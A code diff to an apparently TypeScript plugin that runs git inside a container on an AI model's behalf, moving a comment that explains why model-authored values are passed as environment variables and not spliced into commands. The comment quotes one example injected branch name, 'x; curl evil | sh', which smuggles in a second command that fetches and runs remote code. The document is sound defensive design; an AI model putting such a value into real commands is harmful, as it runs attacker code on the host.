@@ -580,22 +580,6 @@ function repoSurface(
   };
 
   /**
-   * Run git with the token in the environment, never on the command line, and
-   * offered only to `host`.
-   *
-   * `vars` carries every **model-controlled** value — a URL, a branch name, a
-   * commit message — into the container as an environment variable, referenced
-   * inside the command as `"$VAR"`. Interpolating them into the command string
-   * instead would let a model-authored branch name of `x; curl evil | sh` run
-   * as a second command. The container is isolated and the blast radius is its
-   * own filesystem, but "the container contains it" is a reason to be careful
-   * here, not a reason to skip it.
-   *
-   * `host` is never model input: it comes from {@link repoLocation} after the
-   * allowlist check, so the origin the credential is bound to is always one the
-   * host configured.
-   */
-  /**
    * Every container command this plugin runs, and the only place `exec` is
    * allowed to throw.
    *
@@ -630,7 +614,23 @@ function repoSurface(
       }
     });
 
-  /** A container command with no secret in its environment. */
+  /**
+   * A container command with no secret in its environment.
+   *
+   * `vars` carries every **model-controlled** value — a branch name, a commit
+   * message — into the container as an environment variable, referenced inside
+   * the command as `"$VAR"`. Interpolating them into the command string instead
+   * would let a model-authored branch name of `x; curl evil | sh` run as a
+   * second command. The container is isolated and the blast radius is its own
+   * filesystem, but "the container contains it" is a reason to be careful here,
+   * not a reason to skip it.
+   *
+   * `GIT_TERMINAL_PROMPT=0` is passed on every command rather than left to the
+   * image: a command inherits only a small allowlist from the daemon, so a
+   * variable that is not passed here does not reach git at all — and one that
+   * does not reach git is a prompt nobody can answer, on a terminal that does
+   * not exist.
+   */
   const shell = (
     script: string,
     cwd: string,
